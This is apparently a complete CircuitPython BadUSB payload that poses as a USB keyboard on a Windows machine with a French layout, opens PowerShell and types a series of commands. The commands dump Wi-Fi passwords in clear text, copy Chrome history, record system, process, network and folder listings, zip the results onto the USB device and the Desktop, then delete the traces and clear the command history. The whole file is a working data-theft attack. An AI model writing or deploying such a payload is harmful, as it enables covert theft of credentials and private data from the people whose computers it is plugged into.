"""
Exfiltration:
- CIRCUITPY/exfil/data_YYYYMMDD_HHMMSS.zip
- Desktop/EXFILTRATED_DATA.zip
"""

import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from keyboard_layout_win_fr import KeyboardLayout
from keycode_win_fr import Keycode

keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayout(keyboard)

def press_combo(*keys):
    keyboard.press(*keys)
    time.sleep(0.1)
    keyboard.release_all()
    time.sleep(0.1)

def type_text(text):
    layout.write(text)
    time.sleep(0.05)

def press_enter():
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(0.5)

time.sleep(2)

press_combo(Keycode.WINDOWS, Keycode.R)
time.sleep(0.8)
type_text("powershell")
press_enter()
time.sleep(2)

commands = [
    "$temp=$env:TEMP+'\\data_'+[guid]::NewGuid().ToString().Substring(0,8);",
    "mkdir $temp | Out-Null;",
    
    "Get-ComputerInfo | Out-File $temp\\system.txt;",
    "Get-Process | Out-File $temp\\processes.txt;",
    "Get-NetIPAddress | Out-File $temp\\network.txt;",
    
    "tree $env:USERPROFILE\\Documents /F | Out-File $temp\\documents.txt;",
    "tree $env:USERPROFILE\\Desktop /F | Out-File $temp\\desktop.txt;",
    
    "(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Out-File $temp\\wifi.txt;",
    
    "if(Test-Path '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History'){Copy-Item '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History' $temp\\chrome_history.db};",
    
    "$usb=(gwmi win32_volume|?{$_.Label -eq 'CIRCUITPY' -or $_.Label -eq 'RPI-RP2'}).DriveLetter;",
    'if($usb){if(!(Test-Path "$usb\\exfil")){mkdir "$usb\\exfil" | Out-Null}};',
    
    'if($usb){Compress-Archive -Path $temp -DestinationPath "$usb\\exfil\\data_$(Get-Date -Format "yyyyMMdd_HHmmss").zip" -EA SilentlyContinue};',
    
    "Compress-Archive -Path $temp -DestinationPath $env:USERPROFILE\\Desktop\\EXFILTRATED_DATA.zip;",
    
    "Remove-Item -Recurse -Force $temp;",
    "Clear-History;",
    "exit"
]

for cmd in commands:
    type_text(cmd)
    press_enter()
    time.sleep(0.2)  